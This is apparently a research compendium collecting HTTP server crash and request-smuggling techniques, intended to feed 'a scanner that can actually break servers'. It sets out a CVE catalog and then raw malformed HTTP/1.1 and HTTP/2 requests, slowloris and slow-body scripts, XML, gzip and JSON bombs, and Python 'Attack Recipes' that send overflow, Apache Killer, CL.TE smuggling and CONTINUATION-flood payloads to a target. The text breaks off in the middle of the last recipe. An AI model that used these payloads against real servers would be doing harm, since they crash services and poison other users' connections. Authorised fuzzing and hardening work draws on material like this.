# HTTP Server Crash & Disruption Techniques: Research Compendium

*Compiled: 2026-03-05*
*Purpose: Foundation for building a scanner that can actually break servers*
*Scope: Smart breakage via malformed/chaotic requests -- NOT performance/load testing*

---

## Table of Contents

1. [CVE Catalog](#1-cve-catalog)
2. [HTTP/1.1 Parser Edge Cases](#2-http11-parser-edge-cases)
3. [HTTP/2 Attack Catalog](#3-http2-attack-catalog)
4. [Request Smuggling Techniques](#4-request-smuggling-techniques)
5. [Framework-Specific Weaknesses](#5-framework-specific-weaknesses)
6. [Slow/Resource-Exhaustion Attacks](#6-slowresource-exhaustion-attacks)
7. [Compression & Bomb Attacks](#7-compression--bomb-attacks)
8. [Attack Recipes](#8-attack-recipes)
9. [Priority Ranking](#9-priority-ranking)
10. [Research Tools & References](#10-research-tools--references)

---

## 1. CVE Catalog

### 1.1 nginx

| CVE | Version | Trigger | Impact |
|-----|---------|---------|--------|
| CVE-2013-2028 | 1.3.9-1.4.0 | Chunked Transfer-Encoding with large hex chunk size triggers integer signedness error | Stack-based buffer overflow, crash + potential RCE |
| CVE-2014-0133 | 1.3.15-1.5.11 | Crafted SPDY request | Heap-based buffer overflow, RCE |
| CVE-2024-32760 | 1.25.0-1.26.0 | Crafted HTTP/3 request | Buffer overwrite |
| CVE-2024-7347 | Various | Crafted MP4 module request | Buffer overread, crash |

**CVE-2013-2028 Detail:**
The `ngx_http_parse_chunked()` function accepts chunk sizes as hex values. Sending an overly long hex value triggers an integer overflow. The overflowed value is used to determine bytes to read into a stack buffer, causing a stack-based buffer overflow.

```
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked

FFFFFFFFFFFFFFFE
<data>
```

### 1.2 Apache httpd

| CVE | Version | Trigger | Impact |
|-----|---------|---------|--------|
| CVE-2011-3192 | 1.3.x, 2.0.x-2.0.64, 2.2.x-2.2.19 | Range header with many overlapping byte ranges | Memory + CPU exhaustion, crash |
| CVE-2004-0492 | 1.3.25-1.3.31 | Negative Content-Length via mod_proxy | Heap buffer overflow, crash + RCE |
| CVE-2021-44790 | Various | Malformed multipart request body via mod_lua r:parsebody() | Integer underflow, buffer overflow, code execution |
| CVE-2022-30522 | Various | Crafted request to mod_sed filter | Memory exhaustion DoS |
| CVE-2023-38709 | <2.4.64 | Backend returns headers with CRLF characters | HTTP response splitting |
| CVE-2024-24795 | <2.4.59 | CRLF injection across multiple modules | HTTP response splitting, desync |
| CVE-2024-27316 | Various | HTTP/2 CONTINUATION frames without END_HEADERS | Memory exhaustion, crash |

**CVE-2011-3192 "Apache Killer" Detail:**
```
GET / HTTP/1.1
Host: target
Range: bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9,5-10,5-11,5-12,5-13,5-14,5-15,...
```
Sending hundreds of overlapping Range values forces Apache to construct multiple overlapping response parts in memory. Each range creates a separate copy of the overlapping data, causing exponential memory consumption. Exploited in the wild in August 2011.

**CVE-2021-44790 Detail:**
A carefully crafted multipart request body causes an integer underflow in mod_lua's multipart parser, leading to `memcpy()` copying data beyond the buffer boundary. Exact trigger: malformed boundary or content-disposition values that cause the size calculation to underflow.

### 1.3 Node.js / llhttp

| CVE | Version | Trigger | Impact |
|-----|---------|---------|--------|
| CVE-2018-7159 | All current at time | Spaces inside Content-Length value (e.g. `Content-Length: 1 2` parsed as 12) | Request smuggling |
| CVE-2019-15605 | Various | Malformed Transfer-Encoding header | Request smuggling |
| CVE-2022-35256 | Various | Header fields not terminated with CRLF, preceding Transfer-Encoding | Request smuggling |
| CVE-2024-27983 | Various | Malformed HTTP/2 HEADERS frame | Crash with unhandled error |
| CVE-2025-23167 | Various | Headers terminated with `\r\n\rX` instead of `\r\n\r\n` | Request smuggling |
| CVE-2025-59465 | Various | Malformed HTTP/2 HEADERS frame | Server crash |

**CVE-2018-7159 Detail:**
```
GET / HTTP/1.1
Host: target
Content-Length: 1 2
```
Node.js strips internal spaces and interprets `1 2` as decimal `12`. Other servers may interpret this differently, creating a smuggling opportunity.

**CVE-2025-23167 Detail:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
\r\n\rX
```
Node.js accepts `\r\n\rX` as a valid header terminator instead of requiring `\r\n\r\n`, allowing injection of content that other servers interpret differently.

### 1.4 Go net/http

| CVE | Version | Trigger | Impact |
|-----|---------|---------|--------|
| CVE-2020-7919 | 32-bit arch | Malformed ASN.1/x509 input via HTTPS | Panic/crash on 32-bit |
| CVE-2023-39325 | Various | HTTP/2 rapid stream creation + reset | CPU/memory exhaustion |
| CVE-2023-39326 | Various | Chunk extensions cause receiver to read excess bytes | Data over-read |
| CVE-2023-45288 | <1.21.9, <1.22.2 | HTTP/2 CONTINUATION flood with Huffman-encoded headers | CPU exhaustion |
| CVE-2025-22871 | Various | Bare LF in chunked data chunk-size line | Request smuggling |
| Issue #62510 | Various | Wrapped `http.ErrAbortHandler` in downstream handler | Program crash (not just goroutine) |

**CVE-2023-45288 Detail:**
```
# Attack sends HEADERS frame followed by many CONTINUATION frames
# Each CONTINUATION contains Huffman-encoded header data
# No END_HEADERS flag is set
# Server must decode all Huffman data even after exceeding MaxHeaderBytes
# Huffman decoding is far more CPU-expensive than sending compressed data
```
A single TCP connection can exhaust a server's CPU. The asymmetry is key: Huffman-encoded data is cheap to send but expensive to decode.

**CVE-2025-22871 Detail:**
Go's chunked parser accepts bare LF (`\n`) instead of requiring CRLF (`\r\n`) in chunk-size lines:
```
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked

5\n
hello\n
0\n
\n
```
Proxies that reject bare LF will see this as a single request with no body, while Go will parse the chunked body -- classic smuggling.

### 1.5 Apache Tomcat

| CVE | Version | Trigger | Impact |
|-----|---------|---------|--------|
| CVE-2024-24549 | 8.5.0-8.5.98, 9.0.0-9.0.85, 10.1.0-10.1.18, 11.0.0-M1-M16 | HTTP/2 request exceeding header limits | Stream not reset until all headers processed, resource exhaustion |
| CVE-2023-44487 | Various | HTTP/2 Rapid Reset | OutOfMemoryError |

### 1.6 Multipart Parser Vulnerabilities

| CVE | Software | Trigger | Impact |
|-----|----------|---------|--------|
| CVE-2021-44790 | Apache mod_lua | Malformed multipart boundary | Integer underflow, buffer overflow |
| CVE-2025-61770 | Ruby Rack | Excessively long preamble before first boundary | Memory exhaustion, worker crash |
| CVE-2025-61771 | Ruby Rack | Large non-file form fields buffered entirely in memory | Memory exhaustion |
| CVE-2025-7338 | Node.js Multer | Empty field name or malformed boundary | Unhandled exception, process crash |

**CVE-2025-7338 Detail (Multer):**
```
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name=""

value
------WebKitFormBoundary--
```
An empty string as the field name causes Busboy to emit an error event. Multer (<2.0.2) has no error handler for this, causing Node.js to treat it as a fatal exception and terminate the process.

---

## 2. HTTP/1.1 Parser Edge Cases

### 2.1 Request Line Anomalies

**Missing HTTP version (HTTP/0.9 style):**
```
GET /\r\n
```
No `HTTP/1.1` token. Some servers accept this as HTTP/0.9. Others reject it. Parsers may crash when trying to extract a version string from nothing.

**Duplicate spaces in request line:**
```
GET  /path  HTTP/1.1\r\n
```
Extra spaces between method, URI, and version. Most backends treat this as malformed, but some proxies may strip extra spaces, creating a routing discrepancy.

**Absolute URI in request line:**
```
GET http://evil.com/path HTTP/1.1\r\n
Host: target\r\n
```
RFC 7230 requires origin servers to accept absolute-form URIs. If the Host header disagrees with the URI authority, different servers resolve the conflict differently -- one may use Host, another the URI.

**Tab characters in request line:**
```
GET\t/path\tHTTP/1.1\r\n
```
Some parsers treat tabs as equivalent to spaces. Others reject the request. Differential behavior.

### 2.2 Header Parsing Edge Cases

**Obsolete line folding (obs-fold):**
```
GET / HTTP/1.1\r\n
Host: target\r\n
X-Custom: value1\r\n
 continuation of value1\r\n
\r\n
```
RFC 9110 deprecates obs-fold. Some servers accept it (unfolding the value), others reject it, and some treat the continuation line as a new header. This was used in CVE-2025-32094 against Akamai for request smuggling.

**Null bytes in headers:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
X-Header: value\x00injected\r\n
\r\n
```
Null bytes can truncate header values in C-based parsers (which treat \x00 as string terminator) while being passed through by parsers that handle headers as byte arrays.

**Headers without colons:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
InvalidHeaderNoColon\r\n
\r\n
```
Some servers ignore it, some reject the request, some crash.

**Space before colon:**
```
GET / HTTP/1.1\r\n
Host : target\r\n
\r\n
```
RFC 9110 prohibits whitespace between field-name and colon. Different parsers handle this differently.

**Headers terminated with bare LF:**
```
GET / HTTP/1.1\n
Host: target\n
\n
```
Some servers accept `\n` alone as line terminator. Others require `\r\n`. This is a primary smuggling vector (CVE-2025-22871, CVE-2025-23167).

**Very long header values:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
X-Huge: AAAA...AAAA (100KB+)\r\n
\r\n
```
Many servers have configurable limits, but some have fixed-size buffers. Exceeding them may cause truncation, rejection, or crash.

**Duplicate critical headers:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 10\r\n
Content-Length: 50\r\n
\r\n
```
RFC 9110 says multiple Content-Length values with different values MUST be treated as an error. Some servers use the first, some use the last, some concatenate. Classic smuggling vector.

### 2.3 Chunked Encoding Edge Cases

**Chunk extensions (semi-colon after size):**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Transfer-Encoding: chunked\r\n
\r\n
5;ext=val\r\n
hello\r\n
0\r\n
\r\n
```
Chunk extensions are rarely used by legitimate clients. Servers handle them inconsistently, and malformed extensions (bare semicolons, missing values) create parsing discrepancies. CVE-2025-55315 (ASP.NET Core, CVSS 9.9) exploited this.

**Chunk size with leading zeros:**
```
005\r\n
hello\r\n
```
Some parsers treat `005` as octal (5), others as hex (5), and the ambiguity can be exploited when combined with other techniques.

**Chunk size with trailing whitespace:**
```
5 \r\n
hello\r\n
```
Some parsers strip trailing whitespace from chunk sizes, others include it in the hex parse, causing errors or different size interpretations.

**Extremely large chunk size (no data):**
```
FFFFFFFFFFFFFFFF\r\n
```
Declares a chunk of 2^64-1 bytes. Some servers allocate memory based on the declared size before receiving data. Others may have integer overflow.

**Chunk data length mismatch:**
```
3\r\n
hello\r\n
```
Declares 3 bytes but sends 5. Some servers trust the chunk size, others read until CRLF. This creates parsing differences.

### 2.4 Transfer-Encoding Obfuscation

These variations exploit different servers' TE header parsing to cause one to process chunked encoding while another ignores it:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked          (space before colon)
Transfer-Encoding: chunked
Transfer-Encoding: x                 (duplicate, second invalid)
Transfer-Encoding:[tab]chunked       (tab instead of space)
Transfer-Encoding: CHUNKED           (uppercase)
X: X[\n]Transfer-Encoding: chunked   (obs-fold hides TE)
Transfer-Encoding\r\n : chunked      (line folding)
Transfer-Encoding: identity, chunked (multiple values)
```

Research shows ~20% of WAFs can be bypassed by adding an invalid Transfer-Encoding header alongside a valid one. ~15% can be bypassed by combining TE with Content-Length.

### 2.5 Content-Length Edge Cases

**Negative Content-Length:**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: -1\r\n
\r\n
```
CVE-2004-0492 (Apache mod_proxy): Negative Content-Length causes heap buffer overflow. Some C-based parsers interpret -1 as a very large unsigned value.

**Content-Length with spaces (CVE-2018-7159):**
```
Content-Length: 1 2
```
Node.js strips spaces and parses as `12`. Other servers reject or parse as `1`.

**Content-Length: 0 with body:**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 0\r\n
\r\n
SMUGGLED DATA
```
CL.0 smuggling: front-end sees CL:0 and forwards with no body. The smuggled data becomes the start of the next request on a keep-alive connection.

**Both Content-Length and Transfer-Encoding:**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
X
```
The fundamental CL.TE / TE.CL smuggling vector. RFC 7230 says TE takes priority and CL should be removed, but many implementations don't follow this.

### 2.6 HTTP Trailer Edge Cases

**Trailer injection:**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Transfer-Encoding: chunked\r\n
Trailer: X-Injected\r\n
\r\n
5\r\n
hello\r\n
0\r\n
X-Injected: smuggled-value\r\n
\r\n
```
Some servers merge trailer fields into request headers after processing the chunked body. This can inject Content-Length, Transfer-Encoding, or authorization headers that bypass security checks performed only on the initial headers.

---

## 3. HTTP/2 Attack Catalog

### 3.1 Rapid Reset (CVE-2023-44487)

**Mechanism:** Open HTTP/2 stream (HEADERS frame), immediately send RST_STREAM to cancel it. The RST_STREAM frees the stream from the MAX_CONCURRENT_STREAMS limit, allowing another stream to be opened immediately. The server may still be processing the request when the reset arrives.

**Frame sequence:**
```
HEADERS (stream 1, END_HEADERS)  ->
RST_STREAM (stream 1)           ->
HEADERS (stream 3, END_HEADERS)  ->
RST_STREAM (stream 3)           ->
HEADERS (stream 5, END_HEADERS)  ->
RST_STREAM (stream 5)           ->
... (hundreds of thousands per second)
```

**Impact:** 398M rps recorded by Google. Server-side backlog of work accumulates as cleanup can't keep pace with new stream creation. Results in CPU/memory exhaustion.

### 3.2 CONTINUATION Flood (CVE-2024-27316 and related)

**Mechanism:** Send HEADERS frame without END_HEADERS flag, followed by unlimited CONTINUATION frames (also without END_HEADERS). Server must buffer and parse all header data.

**Frame sequence:**
```
HEADERS (stream 1, NO END_HEADERS flag)
  -> partial header block fragment
CONTINUATION (stream 1, NO END_HEADERS flag)
  -> more header data
CONTINUATION (stream 1, NO END_HEADERS flag)
  -> more header data
... (infinite, never setting END_HEADERS)
```

**Impact:** A single TCP connection can crash a server. Even more devastating than Rapid Reset because:
- No complete request is ever formed (harder to detect/log)
- Server must allocate memory for the growing header block
- Huffman-compressed headers are cheap to send but expensive to decode (CVE-2023-45288)

**CVE assignments across implementations:**
- Apache httpd: CVE-2024-27316
- Apache Tomcat: CVE-2024-24549
- Go net/http: CVE-2023-45288
- Node.js: CVE-2024-27983
- Envoy: CVE-2024-27919, CVE-2024-30255
- nghttp2: CVE-2024-28182
- amphp/http: CVE-2024-2653

### 3.3 MadeYouReset (CVE-2025-8671)

**Mechanism:** Send crafted frames that cause the server to reset streams internally, but the server incorrectly treats the reset as a "close" while backend processing continues. This bypasses MAX_CONCURRENT_STREAMS limits.

**Attack primitives:**
1. **WINDOW_UPDATE with delta=0**: Spec-invalid, causes PROTOCOL_ERROR and RST_STREAM
2. **WINDOW_UPDATE overflow**: Increment that makes flow-control window exceed 2^31-1
3. **PRIORITY frame with wrong length**: Length != 5 bytes
4. **DATA frame on idle stream**: Triggers RST_STREAM

```
# Open stream, send HEADERS
HEADERS (stream 1, END_HEADERS, END_STREAM)
# Trigger server-initiated reset via invalid WINDOW_UPDATE
WINDOW_UPDATE (stream 1, increment=0)
# Server sends RST_STREAM but may continue processing the request
# Open new stream (stream 1 no longer counted against limit)
HEADERS (stream 3, END_HEADERS, END_STREAM)
WINDOW_UPDATE (stream 3, increment=0)
... (unbounded concurrent backend processing)
```

**Impact:** Bypasses Rapid Reset mitigations. Affects Apache Tomcat, Netty, Varnish, Fastly, F5, Jetty, IBM WebSphere.

### 3.4 HPACK Compression Bomb

**Mechanism:** Send headers that are small when HPACK-compressed but decompress to very large values. The HPACK dynamic table has a limited size, but the decompressed header values can be much larger.

```
# Send a header with a value that compresses extremely well
# e.g., a 1KB HPACK-encoded block that decodes to 1MB of header data
# Repeat across many CONTINUATION frames
```

**Impact:** Memory exhaustion on the server side.

### 3.5 Zero-Length Headers (CVE-2019-9516)

**Mechanism:** Send headers with empty names and empty values (but non-zero wire overhead). The server allocates memory for each header entry and keeps them until session expiration.

```
# Many HEADERS frames containing:
# name="" (0 bytes), value="" (0 bytes)
# But each takes ~1 byte on wire due to HPACK encoding
# Server allocates memory for each header pair
```

**Impact:** Memory exhaustion over time. Slow-burn DoS.

### 3.6 SETTINGS Flood

**Mechanism:** Send large SETTINGS frames with many repeated parameters. The server must process and acknowledge each.

```
SETTINGS frame with hundreds of repeated parameter entries
# Server CPU spikes to 100% processing the frame
# Must respond with SETTINGS ACK
```

**Impact:** CPU exhaustion. Some implementations reach 100% CPU utilization and full denial of service.

### 3.7 HTTP/2 Pseudo-Header Injection (Downgrade Attacks)

When a front-end speaks HTTP/2 and downgrades to HTTP/1.1 for the backend:

**`:method` injection:**
```
:method = "GET / HTTP/1.1\r\nHost: evil\r\n\r\nSMUGGLED"
:path = "/ignored"
```
If the front-end doesn't validate spaces in `:method`, the entire value is written to the HTTP/1.1 request line.

**Duplicate `:path`:**
```
:path = "/admin"
:path = "/public"
```
Front-end may validate against one path but route using the other.

**CRLF in pseudo-headers:**
HTTP/2 is binary-framed, so CRLF has no special meaning. But when downgraded to HTTP/1.1:
```
:path = "/\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
```
The injected CRLF becomes a real header separator in the HTTP/1.1 request.

**H2.CL smuggling:**
```
:method = POST
:path = /
content-length = 0    (HTTP/2 pseudo-header or regular header)

SMUGGLED DATA IN BODY
```
HTTP/2 uses frame length for body boundaries. The CL header is ignored by the front-end (HTTP/2) but used by the back-end (HTTP/1.1) after downgrading.

---

## 4. Request Smuggling Techniques

### 4.1 Classic Variants

**CL.TE (Content-Length wins on front-end, Transfer-Encoding on back-end):**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 13\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
SMUGGLED
```
Front-end reads 13 bytes of body (including `0\r\n\r\nSMUGGLED`). Back-end sees chunked, reads the `0` chunk (end), and treats `SMUGGLED` as the next request.

**TE.CL (Transfer-Encoding wins on front-end, Content-Length on back-end):**
```
POST / HTTP/1.1\r\n
Host: target\r\n
Content-Length: 3\r\n
Transfer-Encoding: chunked\r\n
\r\n
8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```
Front-end processes chunked (reads 8 bytes, then 0 terminator). Back-end reads 3 bytes of CL body, treats remainder as next request.

**TE.TE (Both support TE, but one can be confused):**
Use obfuscated Transfer-Encoding values so one server processes chunked and the other falls back to Content-Length.

### 4.2 Modern Variants

**CL.0:** Back-end ignores Content-Length entirely (treats body as zero-length). Works against certain endpoints (e.g., static files, redirects) that don't expect a body.

**H2.CL:** HTTP/2 front-end ignores Content-Length (uses frame length). After downgrading to HTTP/1.1, back-end uses the CL header.

**H2.TE:** HTTP/2 front-end downgrads to HTTP/1.1, injecting Transfer-Encoding via HTTP/2 headers.

**TE.0:** Back-end ignores Transfer-Encoding entirely, treating body length as zero. Discovered in 2024 affecting thousands of Google Cloud-hosted websites.

**0.CL:** Front-end sends no Content-Length (or CL:0), but back-end treats the connection data as body content based on a separately injected CL header.

### 4.3 Chunked Extension Smuggling (CVE-2025-55315)

```
POST / HTTP/1.1\r\n
Host: target\r\n
Transfer-Encoding: chunked\r\n
\r\n
5;malformed\r\n
hello\r\n
0\r\n
\r\n
```
Bare semicolons, unusual extension formats, or very long extensions cause parsing discrepancies. ASP.NET Core rated this CVSS 9.9.

### 4.4 Connection State Attacks

**Keep-alive connection poisoning:**
On keep-alive connections, a smuggled request sits in the TCP buffer. The next legitimate user whose request is routed through the same backend connection receives the response intended for the smuggled request, or has their request prefixed with the smuggled data.

**Connection: upgrade smuggling:**
```
GET / HTTP/1.1\r\n
Host: target\r\n
Connection: upgrade\r\n
Upgrade: websocket\r\n
\r\n
```
Some proxies, upon seeing an upgrade request, stop parsing HTTP and pass raw TCP bytes through. If the backend doesn't actually upgrade, the proxy's raw TCP mode allows arbitrary data injection.

---

## 5. Framework-Specific Weaknesses

### 5.1 Flask / Werkzeug

| Issue | Trigger | Impact |
|-------|---------|--------|
| Client-side desync (CVE-2022-29361) | Keep-alive + body not consumed | Full account takeover via XSS |
| Unicode headers + keep-alive | Unicode chars in headers, Connection: keep-alive | CL.0 smuggling -- body treated as next request |
| Content-Length without body | Request with CL set but no body | Request freezes, eventually killed |

**Unicode Header Smuggling Detail:**
Werkzeug doesn't close a request with Unicode characters in headers. If `Connection: keep-alive` is set, the body is not read, and the remaining TCP data is interpreted as the next HTTP request.

### 5.2 Django

| CVE | Trigger | Impact |
|-----|---------|--------|
| CVE-2025-14550 | Numerous duplicate headers via ASGIRequest | Memory exhaustion, crash |
| CVE-2023-41164 | Long Unicode input to uri_to_iri() | CPU exhaustion |
| CVE-2024-27351 | Repeated `<` characters in Truncator.words() | ReDoS |
| Various | Excessive multipart parts | Too many open files, memory exhaustion |

### 5.3 Express.js / Node.js

| CVE | Trigger | Impact |
|-----|---------|--------|
| CVE-2025-7338 (Multer) | Empty field name in multipart upload | Unhandled exception, process crash |
| qs module | High index in query string (e.g., `a[999999]=x`) | Memory exhaustion via sparse array |
| Various llhttp | See Node.js CVE section above | Request smuggling, crash |

### 5.4 Puma (Ruby)

| CVE | Trigger | Impact |
|-----|---------|--------|
| CVE-2024-21647 | Excessively large/numerous chunk extensions | CPU + memory exhaustion |
| CVE-2023-40175 | Incorrect chunked body parsing | Request smuggling |
| CVE-2024-45614 | Header handling issues | Request smuggling |
| CVE-2021-29509 | Various | DoS |
| Gunicorn bug | Sec-Websocket-Key1 header | Smuggling regardless of proxy |

### 5.5 Gunicorn (Python)

| CVE | Trigger | Impact |
|-----|---------|--------|
| CVE-2024-1135 | Invalid Transfer-Encoding not rejected | Request smuggling, endpoint restriction bypass |
| CVE-2024-6827 | TE value not validated per RFC | TE.CL smuggling |
| v20.0.4 | Sec-Websocket-Key1 header parsing | Request smuggling |

### 5.6 WEBrick (Ruby)

| Issue | Trigger | Impact |
|-------|---------|--------|
| Empty Content-Length | Two CL headers, first empty, second with value | Request smuggling (some proxies emit this) |

### 5.7 Go net/http

| Issue | Trigger | Impact |
|-------|---------|--------|
| ErrAbortHandler wrapping | Downstream handler panics with wrapped ErrAbortHandler | Full program crash (not just goroutine recovery) |
| Bare LF acceptance | `\n` instead of `\r\n` in chunked encoding | Request smuggling |
| CONTINUATION flood | Unlimited CONTINUATION frames | CPU exhaustion via Huffman decoding |

### 5.8 Spring Boot (Java)

| CVE | Trigger | Impact |
|-----|---------|--------|
| CVE-2023-34055 | Crafted requests with actuator on classpath | Crash/DoS |
| CVE-2022-22947 | Enabled Gateway Actuator endpoint | Code injection, RCE |
| CVE-2025-22235 | Disabled actuator endpoint + EndpointRequest.to() | Matcher for `null/**` |

---

## 6. Slow/Resource-Exhaustion Attacks

### 6.1 Slowloris (Slow Headers)

```python
# Open connection, send partial headers, never finish
sock.send(b"GET / HTTP/1.1\r\n")
sock.send(b"Host: target\r\n")
# Every 10 seconds, send another partial header to keep connection alive
while True:
    time.sleep(10)
    sock.send(b"X-Keep-Alive: %d\r\n" % random.randint(1, 5000))
# Never send the final \r\n to complete headers
```

**Impact:** Ties up server threads/connections. Each connection costs the server a thread/worker but costs the attacker nearly nothing. Particularly effective against Apache (thread-per-connection model).

### 6.2 Slow Body (R.U.D.Y.)

```python
# Declare large body, send it byte-by-byte
sock.send(b"POST / HTTP/1.1\r\n")
sock.send(b"Host: target\r\n")
sock.send(b"Content-Length: 1000000\r\n")
sock.send(b"\r\n")
# Send body one byte every 10 seconds
for i in range(1000000):
    time.sleep(10)
    sock.send(b"A")
```

**Impact:** Server keeps connection open waiting for the full body. Consumes worker threads.

### 6.3 Slow Read

```python
# Send request normally, but read response very slowly
sock.send(b"GET /large-file HTTP/1.1\r\nHost: target\r\n\r\n")
# Read response 1 byte at a time, with long delays
while True:
    time.sleep(5)
    data = sock.recv(1)
```

**Impact:** Server must keep the response buffered and the connection open. If the server is sending a large response, this consumes significant memory.

### 6.4 HTTP Pipelining Abuse

```python
# Open one connection, pipeline hundreds of requests
requests = b""
for i in range(1000):
    requests += b"GET /heavy-endpoint HTTP/1.1\r\nHost: target\r\n\r\n"
sock.send(requests)
# Don't read any responses
```

**Impact:** Server must process all requests and buffer all responses. Memory exhaustion. OpenBSD httpd crashed due to null pointer dereference when malformed pipelined requests followed valid ones with chunked bodies.

### 6.5 Expect: 100-continue Abuse

```python
sock.send(b"POST /upload HTTP/1.1\r\n")
sock.send(b"Host: target\r\n")
sock.send(b"Content-Length: 1073741824\r\n")  # 1GB
sock.send(b"Expect: 100-continue\r\n")
sock.send(b"\r\n")
# Server sends 100 Continue
# Never send the body
# Repeat on many connections
```

**Impact:** Server allocates resources for the expected large upload. Combined with slow body, amplifies resource consumption.

---

## 7. Compression & Bomb Attacks

### 7.1 Gzip Bomb (Client-to-Server)

When a server accepts `Content-Encoding: gzip` on request bodies:

```
POST / HTTP/1.1
Host: target
Content-Encoding: gzip
Content-Length: 300

<300 bytes of gzip data that decompresses to 10GB>
```

A 300-byte gzip payload can decompress to 10GB with DEFLATE's 1032x compression per round. With nested compression, 1032^2 = ~1M amplification factor.

### 7.2 XML Bomb (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... 9 levels deep ... -->
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```

3 bytes of XML reference expand to 10^9 "lol" strings (~3GB). Crashes XML parsers that don't limit entity expansion.

### 7.3 JSON Depth Bomb

```json
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[...]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
```

Deeply nested arrays/objects cause stack overflow in recursive parsers, or extreme memory consumption in iterative parsers that build the full parse tree.

### 7.4 Infinite Chunked Encoding

```
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked

1
A
1
A
1
A
... (never send 0\r\n to terminate)
```

Server keeps reading chunks indefinitely, consuming memory and a connection slot.

### 7.5 Chunk Overflow

```
POST / HTTP/1.1
Host: target
Transfer-Encoding: chunked

FFFFFFFE
<partial data, then disconnect>
```

Server may allocate a buffer of ~4GB for the declared chunk size.

---

## 8. Attack Recipes

### Recipe 1: Universal Header Corruption (High crash probability)

```python
def send_null_byte_header(target):
    """Null byte in header value -- crashes C-based parsers"""
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"X-Corrupt: before\x00after\r\n"
        b"\r\n"
    )
    sock.send(payload)
```

### Recipe 2: Chunked Encoding Integer Overflow

```python
def send_chunked_overflow(target):
    """Large hex chunk size -- triggers integer overflow in some parsers"""
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"FFFFFFFFFFFFFFFE\r\n"
        b"A\r\n"
        b"0\r\n"
        b"\r\n"
    )
    sock.send(payload)
```

### Recipe 3: Overlapping Range Header (Apache Killer)

```python
def send_range_attack(target):
    """Overlapping byte ranges -- memory exhaustion"""
    ranges = ",".join(["5-%d" % i for i in range(1300)])
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Range: bytes=" + ranges.encode() + b"\r\n"
        b"\r\n"
    )
    sock.send(payload)
```

### Recipe 4: CL.TE Request Smuggling

```python
def send_cl_te_smuggle(target):
    """Classic CL.TE smuggling"""
    body = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n"
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n" + body
    )
    sock.send(payload)
```

### Recipe 5: HTTP/2 CONTINUATION Flood

```python
def send_continuation_flood(target):
    """Single connection, unlimited CONTINUATION frames"""
    # Send HTTP/2 connection preface
    sock.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
    # Send SETTINGS frame
    send_frame(sock, type=0x04, flags=0x00, stream_id=0, payload=b"")
    # Send HEADERS without END_HEADERS (flags=0x00, no 0x04 bit)
    send_frame(sock, type=0x01, flags=0x00, stream_id=1,
               payload=hpack_encode([(":method", "GET"), (":path", "/")]))
    # Send unlimited CONTINUATION frames (type=0x09)
    while True:
        # Huffman-encoded headers: cheap to send, expensive to decode
        send_frame(sock, type=0x09, flags=0x00, stream_id=1,
                   payload=huffman_encode("X" * 16384))
```

### Recipe 6: Negative Content-Length

```python
def send_negative_cl(target):
    """Negative Content-Length -- buffer overflow in some servers"""
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Content-Length: -1\r\n"
        b"\r\n"
        b"AAAA"
    )
    sock.send(payload)
```

### Recipe 7: Malformed Multipart with Empty Field Name

```python
def send_malformed_multipart(target):
    """Empty field name crashes Multer/Busboy"""
    boundary = b"----FormBoundary"
    body = (
        b"------FormBoundary\r\n"
        b'Content-Disposition: form-data; name=""\r\n'
        b"\r\n"
        b"value\r\n"
        b"------FormBoundary--\r\n"
    )
    payload = (
        b"POST /upload HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"Content-Type: multipart/form-data; boundary=----FormBoundary\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"\r\n" + body
    )
    sock.send(payload)
```

### Recipe 8: Obs-Fold Header Injection

```python
def send_obs_fold(target):
    """Obsolete line folding to hide headers"""
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + target.encode() + b"\r\n"
        b"X-Legit: value\r\n"
        b" Transfer-Encoding: chunked\r\n"  # obs-fold continuation
        b"\r\n"
